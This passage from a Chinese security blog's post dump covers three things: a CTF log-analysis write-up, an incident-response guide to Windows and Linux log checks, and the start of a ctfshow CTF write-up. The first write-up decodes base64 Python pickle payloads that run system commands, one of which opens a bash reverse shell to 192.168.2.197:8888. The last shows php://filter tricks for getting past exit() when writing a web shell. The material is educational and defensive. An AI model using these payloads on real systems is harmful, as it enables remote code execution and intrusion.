10:43:12] \"GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1\" 500 -\n127.0.0.1 - - [07/Aug/2021 10:43:12] \"GET /?user=STAKcDAKMFMnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuMTk3Lzg4ODggMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4= HTTP/1.1\" 500 -\n```\n\n这三个payload拿去解码一下\n\n```\nI0\np0\n0S'whoami'\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.\n```\n\n```\nI0\np0\n0S'cat /Th4s_IS_VERY_Import_Fi1e'\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.\n```\n\n```\nI0\np0\n0S'bash -i >& /dev/tcp/192.168.2.197/8888 0>&1'\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.\n```\n\n到第二个就可以看到他在执行的操作了\n\n```\nos.system('cat /Th4s_IS_VERY_Import_Fi1e')\n```\n\n那文件的绝对路径就有了\n\n```\nNSSCTF{/Th4s_IS_VERY_Import_Fi1e}\n```\n\n# [陇剑杯 2021]简单日志分析（问3）\n\n问题：某应用程序被攻击，请分析日志后作答：\n黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口\"，例如127.0.0.1:2333）。得到的flag请使用NSSCTF{}格式提交。\n\n解题：\n\n在上面第三个payload中就可以看到反弹shell的操作了\n\n```\nbash -i >& /dev/tcp/192.168.2.197/8888 0>&1\n```\n\n```\nNSSCTF{192.168.2.197:8888}\n```\n\n","tags":["陇剑杯2021"],"categories":["赛题wp"]},{"title":"应急响应日志分析汇总（持续更新）","url":"/2025/04/17/应急响应（持续更新）/","content":"\n# 0x01前言\n\n应急响应的话我认为是每一个学信安的人需要去学习的，所以我也是对此进行了响应的学习和积累，希望在以后发生真实的事件时能第一时间进行良好的反馈\n\n借鉴师傅的文章:(这里的话还是有点多的，毕竟这个话题的分区还是蛮多的)\n\nhttps://bypass007.github.io/Emergency-Response-Notes/Summary/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5.html\n\nwindows入侵排查:https://www.freebuf.com/articles/network/286270.html\n\nwindows分析事件日志:https://zone.huoxian.cn/d/868-windows\n\n常见Windows事件ID状态码:https://www.cnblogs.com/chddt/p/13262385.html\n\n# 0x02应急响应\n\n在学习应急响应之前，我们首先要先了解什么是应急响应\n\n## 什么是应急响应？\n\n应急响应（Incident Response Service，IRS）是当企业系统遭受病毒传播、网络攻击、黑客入侵等安全事件导致信息业务中断、系统宕机、网络瘫痪，数据丢失、企业声誉受损，并对组织和业务运行产生直接或间接的负面影响时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，同时分析入侵原因、还原入侵过程、评估业务损失、溯源黑客取证并提出解决方案和防范措施，减少企业因黑客带来的相关损失。\n\n## 常见的应急响应事件分类\n\nweb入侵：网页挂马、主页篡改、Webshell\n\n系统入侵：病毒木马、勒索软件、远控后门\n\n网络攻击：DDOS攻击、DNS劫持、ARP欺骗\n\n讲完了基础的概念，接下来我们进行学习不同的一些应急响应的排查思路\n\n## 一.windows入侵排查\n\n如果我们的Windows操作系统被黑客入侵或攻击了，我们第一要做的不是怎么去做防御和应急响应，而是去分析黑客入侵的过程，然后根据可能的入侵点逐步去拆解分析，这样才能更快更高效的进行应急响应\n\n### 分析入侵过程\n\n攻击者入侵windows系统往往从弱口令、系统漏洞以及服务漏洞进行切入，获得一个普通的系统权限，再经过提权后进行创建启动项、修改注册表、植入病毒和木马等一系列操作，从而维持对目标主机的控制权(也就是我们说的权限维持)。而与此同时操作系统也会出现异常，包括账户、端口、进程、网络、启动、服务、任务以及文件等，系统运维人员可以根据以上异常情况来知道攻击者从何处入侵、攻击者以何种方式入侵以及攻击者在入侵后做了什么这几个问题的答案，从而为之后的系统加固、安全防护提供针对性建议。\n\n暴力破解：针对系统有包括rdp、ssh、telnet等，针对服务有包括mysql、ftp等，一般可以通过超级弱口令工具、hydra进行爆破\n\n漏洞利用：通过系统、服务的漏洞进行攻击，如永恒之蓝、Redis未授权访问等\n\n流量攻击：主要是对目标机器进行dos攻击，从而导致服务器瘫痪\n\n木马控制：主要分为webshell和PC木马，webshell是存在于网站应用中，而PC木马是进入系统进行植入。目的都是对操作系统进行持久控制\n\n病毒感染：主要分挖矿病毒、蠕虫病毒、勒索病毒等，植入病毒后往往会影响受感染电脑的正常运作，或是被控制而不自知，电脑正常运作仅盗窃资料、或者被利用做其他用途等用户非自发引导的行为\n\n这些的话我们后面会分别去具体讲解，这里的话就只是提一下攻击的方式\n\n### 入侵排查思路\n\n#### 1.1检查系统账号安全\n\n攻击者面对windows系统会先从用户密码入手，首先是通过rdp服务对Administrator、Guest等默认账户的口令爆破，如果爆破没结果的话会固定密码，对用户账号进行爆破，再之后加入还是失败的话就是社工生成账号、密码字典，运气好那么就可以直接登录到管理员账号。在拿到系统权限后，权限维持则是必不可少的一步，创造一个新的管理账号方便后期登录查看就是一个不错的方法，当然为了增加隐蔽性该账号可以是影子账户。根据这几方面，检查看系统账号时可以重点关注弱口令、可疑账号、影子账户。\n\n1.查看服务器是否存在弱口令，远程管理端口是否对公网开放。\n\n- 据实际情况咨询相关服务器管理员。\n\n- 尝试使用弱口令登录爆破\n\n2.排查是否存在可疑账号或新增账号\n\n- 打开 cmd 窗口，输入`lusrmgr.msc`命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。\n\n![image-20241203164938592](./../image/achieve/202411/日志分析汇总/image-20241203164938592.png)\n\n这里的话因为版本问题我只能去控制面板里面去进行查看\n\n3.查看服务器是否存在隐藏账号、克隆账号。\n\n- 打开注册表，查看管理员对应键值\n  1、win+R，输入 regedit，打开注册表编辑器\n  2、选择 HKEY_LOCAL_MACHINE/SAM/SAM，默认无法查看该选项内容，右键菜单选择权限，打开权限管理窗口\n  3、选择当前用户（一般为 administrator），将权限勾选为完全控制，然后确定并关闭注册表编辑器\n  4、再次打开注册表编辑器，即可选择 HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users\n  5、在 Names 项下可以看到实例所有用户名，如出现本地账户中没有的账户，即为隐藏账户，在确认为非系统用户的前提下，可删除此用户\n- 使用D盾_web查杀工具，集成了对克隆账号检测的功能。\n\n![img](./../image/achieve/202411/日志分析汇总/sum-1-1.png)\n\n![image](./../image/achieve/202411/日志分析汇总/1629946137_612701198ddf08a7cffa0.png!small)\n\n4.结合日志，查看管理员登录时间、用户名是否存在异常\n\n- 检查方法：\n\n  a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”,分析用户登录日志\n\n![image-20241203165534883](./../image/achieve/202411/日志分析汇总/image-20241203165534883.png)\n\n​\tb、通过LogFusion查看日志记录\n\n![image](./../image/achieve/202411/日志分析汇总/1630057913_6128b5b99a92b818cd7cb.png!small)\n\n​\t下载地址:https://www.logfusion.ca/\n\n​\t付费软件，可以有免费试用版\n\n​\t也可以用Log Parser\n\n​\t下载地址:http://www.logparser.com/\n\n#### 1.2检查异常端口、进程\n\n什么是端口?端口是一个数字标识符，用于在计算机网络中区分不同的通信会话。每个应用程序或服务都可以通过特定的端口号来接收和发送数据。端口号位于IP地址的基础上，形成一个完整的网络地址，使得多个应用程序可以在同一台计算机上同时运行而不会相互干扰。\n\n端口作为计算机内部与外部数据交互的窗口，在攻击者眼里也是作为`香饽饽`的存在，在入侵系统后，攻击者可以在计算机上开启专属的端口来访问被害主机或植入病毒用于挖矿等，熟悉计算机的朋友应该都知道常用的端口也就那么几个，所以通过排查可疑端口能确定主机是否存在后门、是否被植入挖矿病毒等，再根据端口的PID对可疑进程对应的程序排查，确定是否为恶意程序。\n\n1、检查端口连接情况，是否有远程连接、可疑连接\n\n- 检查方法1：\n\n  a、查看目前的网络连接，定位可疑的ESTABLISHED\n\n  ```\n  netstat -ano \n  ```\n\n  b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 \n\n  ```\n  tasklist | findstr “PID”\n  ```\n\n- 检查方法2:\n\n​\ta、通过D盾web查杀工具进行端口查看\n\n![image](./../image/achieve/202411/日志分析汇总/1629946161_612701310682fe5ff87c1.png!small)\n\n2.检查排查可疑的进程\n\n- 检查方法1：\n\n​\ta、开始--运行--输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。\n\n- 检查方法2：\n\n​\ta、打开D盾_web查杀工具的进程查看，关注没有签名信息的进程\n\n- 检查方法3：\n\n​\ta、通过微软官方提供的 Process Explorer 等工具进行排查\n\n在查看可疑的进程及其子进程。可以重点观察以下内容：\n\n> 1、没有签名验证信息的进程\n> 2、没有描述信息的进程\n> 3、进程的属主\n> 4、进程的路径是否合法\n> 5、CPU 或内存资源占用长时间过高的进程\n\n#### 1.3检查启动项，计划任务，服务\n\n什么是启动项、计划任务、服务？\n\n启动项（Startup Items）\n\n**定义**: 启动项是指在操作系统启动时自动加载和运行的程序或服务。它们通常在系统启动阶段被调用，以便提供系统所需的功能或用户应用程序。\n\n**作用**:\n\n- 快速访问常用程序：例如，某些聊天软件、云存储客户端等可以在启动时自动运行，便于用户快速使用。\n- 提供系统服务：某些驱动程序和系统服务需要在启动时加载，以确保设备正常工作。\n\n计划任务（Scheduled Tasks）\n\n**定义**: 计划任务是指在指定时间或按特定条件自动执行的任务或程序。用户可以设置这些任务在系统空闲时，或者在特定的时间（如每天、每周等）运行。\n\n**作用**:\n\n- 自动化重复性工作：例如，定期备份文件、自动更新或运行维护脚本等。\n- 资源管理：可以在系统负载较低的时段运行资源密集型任务，以提高效率。\n\n服务（Services）\n\n**定义**: 服务是指在后台运行的程序，通常没有用户界面，负责执行某些系统级或应用级的功能。服务在操作系统启动时加载，并在系统运行期间持续运行。\n\n**作用**:\n\n- 提供系统功能：例如，打印服务、网络服务、数据库服务等。\n- 支持客户端应用程序：许多应用程序依赖于在后台运行的服务，例如Web服务器（如Apache或Nginx）和邮件服务器。\n\n启动项、计划任务、服务是攻击者维持权限的惯用手段。在入侵windows计算机后，攻击者可以通过修改注册表、替换粘滞键程序在系统启动时就获得权限，也能够在管理员权限下设置计划任务，因为计划任务后门分为管理员权限和普通用户权限两种。管理员权限可以设置更多的计划任务，例如重启后运行等。也可以通过meterpreter创建后门服务。\n\n1.排查异常启动项\n\n- 检查方法1:\n\n​\ta、登录服务器，单击【开始】>【所有程序】>【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。\n\n- 检查方法2:\n\n​\ta.win+R并键入msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。\n\n![image-20241203171440120](./../image/achieve/202411/日志分析汇总/image-20241203171440120.png)\n\n- 检查方法3：\n\n​\ta.win+R并键入regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce\n```\n\n![image-20241203171759373](./../image/achieve/202411/日志分析汇总/image-20241203171759373.png)\n\n- 检查方法4:\n\n​\ta.用安全软件查看启动项、开机时间管理等。\n\n- 检查方法5:\n\n​\ta.组策略，win+R运行gpedit.msc\n\n![image](./../image/achieve/202411/日志分析汇总/1629946273_612701a1044530892cb01.png!small)\n\n2.排查计划任务\n\n- 检查方法1：\n\n​\ta.win+R并键入control打开控制面板\n\n​\tb.在 系统与安全 中查看计划任务属性，便可以发现木马文件的路径。\n\n- 检查方法2:\n\n​\ta.打开命令行窗口并键入at检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。在windows7及之前版本的操作系统中使用at命令进行调用，在从windows8版本开始的操作系统中使用schtasks命令调用。\n\n- 检查方法3：\n\n​\ta.利用安全软件查看计划任务。\n\n3.排除服务自启动\n\n- 检查方法：win+R输入services.msc，注意服务状态和启动类型，检查是否有异常服务。\n\n![image-20241203174338138](./../image/achieve/202411/日志分析汇总/image-20241203174338138.png)\n\n#### 1.4检查系统相关信息\n\n前面我们有提到，攻击者入侵windows系统往往从弱口令、系统漏洞以及服务漏洞进行切入，那么如果我们系统本身存在漏洞，这种的危害和结果往往是最致命的，例如风靡全球的永恒之蓝漏洞，如果计算机存在永恒之蓝漏洞且未采取防护措施。那么攻击者就能直接通过MSF的漏洞利用程序获取目标windows系统的system权限。与此同时，攻击者在进入系统后往往也会留一些蛛丝马迹，如未将上传文件清除、浏览器浏览记录未删除、下载的文件未删除等。在检查系统相关信息时就需要重点关注系统本身存在的漏洞以及攻击者使用过的文件。\n\n1.查看系统版本以及补丁信息\n\n- 检查方法1：\n\n​\ta.win+R输入systeminfo，查看系统信息和补丁状态\n\n- 检查方法2:\n\n​\ta.将内容导入文本，利用 windows-exploit-suggester 对系统补丁进行漏洞利用分析\n\n```\npython windows-exploit-suggester.py --database 2021-08-26-mssb.xls --systeminfo systeminfo.txt\n```\n\n![image](./../image/achieve/202411/日志分析汇总/1629946355_612701f326046a43de557.png!small)\n\n2.查看可疑的目录和文件\n\n- 检查方法1：\n\n​\ta.查看用户目录，是否存在新建用户目录\n\nWindow 2003版本 : C:\\Documents and Settings \n\nWindow 2003以后版本 : C:\\Users\\\n\n- 检查方法2:\n\n​\ta.win+R输入%UserProfile%\\Recent，分析最近打开分析可疑文件。\n\n![image-20241203175304816](./../image/achieve/202411/日志分析汇总/image-20241203175304816.png)\n\n- 检查方法3:\n\n​\ta.、点击文件资源管理器，查找服务器内中的各个文件夹\n\n​\tb、将文件夹文件按时间进行排序，查找可疑文件，其中修改时间在创建时间之前的为可疑文件，也可以在搜索中搜索某一时间修改的文件。重点关注windows\\system32的sethc.exe是否被替换为cmd程序\n\n- 检查方法4:\n\n​\ta.排查回收站，浏览器下载目录以及历史记录\n\n3.查看隐藏文件\n\n1、win+R输入 control，进入控制面板\n2、找到文件资源管理器选项，点击 查看 后，取消”隐藏受保护的操作系统文件“勾选，在隐藏文件和文件夹下面的单选选择显示隐藏的文件、文件夹和驱动器\n\n4.得到发现webshell、远控木马的创建时间，如何找出同一时间范围内创建的文件？\n\n a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。\n\n b、利用计算机自带文件搜索功能，指定修改时间进行搜索。\n\n#### 1.5日志分析\n\nwindows日志分为五类\n\n- 应用程序日志--安装应用程序产生的事件\n- 安全日志--主要记录用户操作产生的日志，例如登入/登出，清除日志等。\n- Setup日志 #安装日志--记录安装中间件或者框架类似的事件产生的日志。\n- 系统日志--主要记录关于windwos系统产生的事件id\n- Forwarded Events日志 #转发日志--一般没什么值得看的\n\n主要查看系统日志和web日志，通过日志可以帮助我们验证对入侵过程的判断和发现其他入侵行为。但它的前提则是日志记录已开启的情况下才能获取。这块具体会在之后的日志分析篇提到\n\n进行Windows安全日志分析首先需要了解一些事件ID\n\n系统日志\n\n- 分析方法：\n\n  a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。\n\n  b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。\n\n  C、可以直接分析(包括应用程序、安全、Setup、系统、事件)也可以导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。\n\n##### 常见的Windows事件ID\n\n- \\### 用户操作事件id ### \n- 1102-清理审计日志 \n- 1105-自动备份事件日志 \n- 4624-帐户已成功登录 \n- 4625-帐户登录失败 \n- 4634-帐户被注销包括锁屏 \n- 4647-用户发起注销 \n- 4648-使用显式凭据尝试登录 \n- 4649-检测到重播攻击 \n- 4657-修改注册表值 \n- 4665-尝试创建应用程序客户端上下文。 \n- 4666-应用程序尝试了一个操作 \n- 4670-对象的权限已更改 \n- 4672-给新登录分配特权 \n- 4674-尝试对特权对象执行操作 \n- 4692-尝试备份数据保护主密钥 \n- 4696-主要令牌已分配给进程 \n- 4697-添加服务 \n\n**计划任务事件id**\n\n- 4698-已创建计划任务 \n- 4699-计划任务已删除 \n- 4700-已启用计划任务 \n- 4701-计划任务已禁用 \n- 4702-计划任务已更新 \n- 4703-令牌权已经调整 \n- 4704-已分配用户权限 \n- 4705-用户权限已被删除 \n- 4706-为域创建了新的信任 \n- 4707-已删除对域的信任 \n- 4709-IPsec服务已启动 \n- 4710-IPsec服务已禁用 \n- 4713-Kerberos策略已更改 \n- 4717-系统安全访问权限已授予帐户 \n- 4718-系统安全访问已从帐户中删除 \n- 4719-系统审核策略已更改 \n- 4720-已创建用户帐户 \n- 4722-用户帐户已启用 \n- 4723-尝试更改帐户的密码 \n- 4724-尝试重置帐户密码 \n- 4725-用户帐户已被禁用 \n- 4726-用户帐户已删除 \n- 4727-已创建启用安全性的全局组 \n- 4728-已将成员添加到启用安全性的全局组中 \n- 4729-成员已从启用安全性的全局组中删除 \n- 4730-已删除启用安全性的全局组 \n- 4731-已创建启用安全性的本地组 \n- 4732-已将成员添加到启用安全性的本地组 \n- 4733-成员已从启用安全性的本地组中删除 \n- 4734-已删除已启用安全性的本地组 \n- 4735-已启用安全性的本地组已更改 \n- 4737-启用安全性的全局组已更改 \n- 4738-用户帐户已更改 \n- 4740-用户帐户已被锁定 \n- 4741-已创建计算机帐户 \n- 4742-计算机帐户已更改 \n- 4743-计算机帐户已删除 \n- 4744-已创建禁用安全性的本地组 \n- 4745-已禁用安全性的本地组已更改 \n- 4746-已将成员添加到已禁用安全性的本地组\n-  4747-已从安全性已禁用的本地组中删除成员 \n- 4756-已将成员添加到启用安全性的通用组中 \n- 4765-SID历史记录已添加到帐户中 \n- 4767-用户帐户已解锁 \n- 4768-请求了Kerberos身份验证票证（TGT） \n- 4769-请求了Kerberos服务票证 \n- 4770-更新了Kerberos服务票证 \n- 4774-已映射帐户以进行登录 \n- 4775-无法映射帐户以进行登录 \n- 4776-域控制器尝试验证帐户的凭据 \n- 4777-域控制器无法验证帐户的凭据 \n- 4778-会话重新连接到Window Station \n- 4782-密码哈希帐户被访问 \n- 4794-尝试设置目录服务还原模式管理员密码 \n- 4797-试图查询帐户是否存在空白密码 \n- 4798-枚举了用户的本地组成员身份。 \n- 4799-已枚举启用安全性的本地组成员身份 \n- 4800-工作站已锁定 \n- 4801-工作站已解锁 \n- 4802-屏幕保护程序被调用 \n\n**域相关事件id** \n\n- 4820-Kerberos票证授予票证（TGT）被拒绝，因为该设备不符合访问控制限制 \n- 4821-Kerberos服务票证被拒绝，因为用户，设备或两者都不符合访问控制限制 \n- 4822-NTLM身份验证失败，因为该帐户是受保护用户组的成员 \n- 4823-NTLM身份验证失败，因为需要访问控制限制 \n- 4825-用户被拒绝访问远程桌面。默认情况下，仅当用户是Remote Desktop Users组或Administrators组的成员时才允许用户进行连接 \n\n**防火墙策略事件id** \n\n- 4946-已对Windows防火墙例外列表进行了更改。增加了一条规则 \n- 4947-已对Windows防火墙例外列表进行了更改。规则被修改了 \n- 4948-已对Windows防火墙例外列表进行了更改。规则已删除 \n- 5024-Windows防火墙服务已成功启动 \n- 5025-Windows防火墙服务已停止  \n\n**目录服务事件id** \n\n- 5137-已创建目录服务对象 \n- 5140-访问了网络共享对象 \n- 5142-添加了网络共享对象。 \n- 5145-检查网络共享对象以查看是否可以向客户端授予所需的访问权限 \n- 5156-Windows筛选平台允许连接 5157-Windows筛选平台已阻止连接\n\n- 事件ID 7045 - 系统中安装了服务\n\n突然出现未知服务可能表明恶意软件安装,因为许多类型的恶意软件会将自己安装为服务。\n\nWEB访问日志\n\n- 分析方法：\n\n  a、找到中间件的web日志，打包到本地方便进行分析。\n\n  b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。\n\n   Linux下，使用Shell命令组合查询分析\n\n#### 1.6工具查杀\n\n推荐用D盾或者河马进行查杀\n\nD盾_Web查杀：http://www.d99net.net/index.asp\n\n河马webshell查杀：[http://www.shellpub.com](http://www.shellpub.com/)\n\n# 0x03日志分析\n\n## linux日志分析\n\n### 日志介绍\n\n在 Linux 系统中，日志记录了系统中包括内核、服务和其它应用程序等在内的运行信息。在我们解决问题的时候，日志是非常有用的，它可以帮助我们快速的定位遇到的问题。\n\n### 常见日志文件\n\n#### 日志文件的分类\n\n1. 系统日志（System Logs）：\n   - 这些日志记录了系统整体运行情况、错误信息等。\n   - 常见的系统日志文件包括`/var/log/messages`、`/var/log/syslog`等。\n   - 这些文件通常包含由系统服务rsyslog或systemd-journald管理的内核消息及各种系统程序消息。\n2. 用户日志（User Logs）：\n   - 用于记录用户操作、登录信息等。\n   - 常见的用户日志文件包括`/var/log/wtmp`（记录所有用户的登录和注销信息）、`/var/log/lastlog`（记录每个用户最近一次登录时间）等。\n3. 应用程序日志（Application Logs）：\n   - 记录各个应用程序的运行情况、错误信息等。\n   - 这些日志通常保存在应用程序的特定目录下，如Apache的日志文件`/var/log/apache2/access.log`（访问日志）和`error.log`（错误日志）。\n   - 不同的应用程序可能使用不同的日志格式和命名方式。\n4. 安全日志（Security Logs）：\n   - 记录系统的安全事件信息，包括登录、权限变更等。\n   - 常见的安全日志文件包括`/var/log/auth.log`（在Debian和Ubuntu系统中）、`/var/log/secure`（在Red Hat和CentOS系统中）等。\n5. 内核日志（Kernel Logs）：\n   - 记录Linux内核的运行信息、错误信息等。\n   - 常见的内核日志文件包括`/var/log/kern.log`等。\n   - 内核日志对于诊断内核相关的问题非常有用。\n6. 软件包管理器日志（Package Manager Logs）：\n   - 记录软件包管理器（如apt、yum等）的操作信息。\n   - 常见的软件包管理器日志文件包括`/var/log/dpkg.log`（在Debian和Ubuntu系统中）、`/var/log/yum.log`（在Red Hat和CentOS系统中）等。\n7. 其他特定日志文件：\n   - 根据系统和安装的软件，可能还有其他特定的日志文件。\n   - 例如，`/var/log/dmesg`记录了内核启动时的消息，`/var/log/cron`记录了定时任务的执行情况等。\n\n日志默认存放位置：/var/log/\n查看日志配置情况：more /etc/rsyslog.conf\n\n#### 常见的日志文件\n\n1. **`/var/log/syslog`** 或 **`/var/log/messages`**\n   - **用途**: 记录系统范围内的通用日志消息，包括启动信息、设备事件和其他系统级事件。\n   - **注意**: `syslog` 通常在 Debian 系及其衍生版本中使用，而 `messages` 通常在 Red Hat 系及其衍生版本中使用。\n2. **`/var/log/auth.log`** 或 **`/var/log/secure`**\n   - **用途**: 记录与系统认证相关的事件，如用户登录尝试、`sudo` 操作、SSH 登录等。\n   - **注意**: `auth.log` 常用于 Debian 系，`secure` 常用于 Red Hat 系。\n3. **`/var/log/kern.log`**\n   - **用途**: 记录所有内核生成的消息。对于调试硬件相关问题非常有用。\n4. **`/var/log/dmesg`**\n   - **用途**: 记录系统引导期间内核检测到的硬件信息。可以使用 `dmesg` 命令查看。\n5. **`/var/log/boot.log`**\n   - **用途**: 记录系统启动过程中服务启动和停止的信息。\n6. **`/var/log/cron.log`**\n   - **用途**: 记录由 cron 和 at 调度服务执行的任务。\n7. **`/var/log/maillog`** 或 **`/var/log/mail.log`**\n   - **用途**: 记录邮件系统活动，如发送和接收的邮件、邮件服务器的错误等。\n8. **`/var/log/httpd/`** 或 **`/var/log/apache2/`**\n   - **用途**: 包含 Apache HTTP Server 的访问日志和错误日志。\n9. **`/var/log/mysql/`**\n   - **用途**: 包含 MySQL 服务器的日志文件，包括错误日志、查询日志等。\n10. **`/var/log/faillog`**\n    - **用途**: 记录用户登录失败的尝试和失败原因。\n11. **`/var/log/lastlog`**\n    - **用途**: 包含每个用户最后一次登录的时间信息。\n12. **`/var/log/btmp`**\n    - **用途**: 记录失败的登录尝试。可以使用 `lastb` 命令查看。\n13. **`/var/log/wtmp`**\n    - **用途**: 记录所有用户登录和注销事件。可以使用 `last` 命令查看\n\n### 系统日志级别\n\n数值越小，优先级越高，级别越高\n\n| 数值 | 类型    | 说明                                                     |\n| ---- | ------- | -------------------------------------------------------- |\n| 0    | emerg   | 紧急情况，系统不可用（例如系统崩溃），一般会通知所有用户 |\n| 1    | alert   | 需要立即修复，例如系统数据库损坏                         |\n| 2    | crit    | 危险情况，例如硬盘错误，可能会阻碍程序的部分功能         |\n| 3    | err     | 一般错误消息                                             |\n| 4    | warning | 警告                                                     |\n| 5    | notice  | 不是错误，但是可能需要处理                               |\n| 6    | info    | 通用性消息，一般用来提供有用信息                         |\n| 7    | debug   | 调试程序产生的信息                                       |\n\n### 日志分析技巧\n\nLinux下常用的shell命令如：find、grep 、[egrep](https://so.csdn.net/so/search?q=egrep&spm=1001.2101.3001.7020)、awk、sed\n\ngrep 查找含有某字符串的所有文件\n\n```\ngrep -rn \"hello,world!\"\n* : 表示当前目录所有文件，也可以是某个文件名\n-r 是递归查找\n-n 是显示行号\n-R 查找所有文件包含子目录\n-i 忽略大小写\n```\n\n```\n1、定位有多少IP在爆破主机的root帐号：\ncat /var/log/auth.log.1 | grep -a \"Failed password for root\" | awk '{print $11}' | sort | uniq -c | sort -nr | more\n2.定位有哪些IP在爆破：\ngrep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.\n(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4]\n[0-9]|[01]?[0-9][0-9]?)\"|uniq -c\n3.爆破成功登陆的IP\ncat auth.log.1 | grep -a \"Accepted \" | awk '{print $11}' | sort | uniq -c | sort -nr | more\n4.爆破用户名字典是什么？\ncat auth.log.1 | grep -a \"Failed password\" |perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr\n5.成功登录 root 用户的 ip 一共爆破了多少次\ncat /var/log/auth.log.1 | grep -a \"Failed password for root\" | awk '{print $11}' | sort | uniq -c | sort -nr | more\n6、登录成功的IP有哪些：\ngrep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more\n7.登录成功的日期、用户名、IP：\ngrep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'\n分析用户日志\n增加一个用户kali日志：\nJul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001\nJul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001,home=/home/kali, shell=/bin/bash\nJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali\n#grep \"useradd\" /var/log/secure\n删除用户kali日志：\nJul 10 00:14:17 localhost userdel[2393]: delete user 'kali'\nJul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'\nJul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'\n# grep \"userdel\" /var/log/secure\n5、su切换用户：\nJul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by\nroot(uid=0)\nsudo授权执行:\nsudo -l\nJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ;\nCOMMAND=/sbin/shutdown -r now\n\n```\n\n## mysql日志分析\n\n常见的数据库攻击包括SQL注入，弱口令，提权，窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。\n\nMySQL日志分类:\n\n- 错误日志\n- 查询日志\n- 慢查询日志\n- 事务日志(Redo log)\n- 二进制日志\n- 中继日志\n\n### 1.开启日志分析\n\n\n\n","tags":["应急响应日志分析汇总"],"categories":["应急响应日志分析汇总"]},{"title":"ctfshow新春欢乐赛(已做完)","url":"/2025/04/17/ctfshow新春欢乐赛(已做完)/","content":"\n# 热身\n\n![image-20250131233707641](../image/achieve/202411/新春欢乐赛/image-20250131233707641.png)\n\n这个确实是热身，一开始以为直接找flag就行，但是没找到，后面查看了一下phpinfo找到了一个路径\n\n![15cc588af87ce617a13ab1fa6e7f4f8](../image/achieve/202411/新春欢乐赛/15cc588af87ce617a13ab1fa6e7f4f8.png)\n\nauto_prepend_file 是 PHP 的一个配置选项，用于指定在每个 PHP 脚本执行之前自动包含的文件。\n\n这个文件路径看着比较可疑，所以我去读取了一下，果然是有flag的\n\n# web1\n\n![image-20250131234637782](../image/achieve/202411/新春欢乐赛/image-20250131234637782.png)\n\n## #死亡exit()绕过\n\n意思就是我们无论写入什么都会因为插入一句exit()去强制结束运行\n\n需要绕过exit()的地方一般都是`file_put_contents`\n\n主要思路：利用php伪协议的写过滤器，对即将要写的内容（content）进行处理后，会将<?php exit();处理成php无法解析的内容，而我们的content则会被处理成正常的payload。\n\n大致有如下三种\n\n```\nfile_put_contents($filename,\"<?php exit();\".$content);\nfile_put_contents($content,\"<?php exit();\".$content);\nfile_put_contents($filename,$content . \"\\nxxxxxx\");\n```\n\n## 第一种:\n\n```\nfile_put_contents($filename,\"<?php exit();\".$content);\n```\n\n#### base64编码绕过\n\n```\nfilename=php://filter/convert.base64-decode/resource=shell.php\ncontent=aPD9waHAgcGhwaW5mbygpOz8+\n```\n\n利用`php://filter`，先将内容进行解码后再写入文件\n\n`<?php 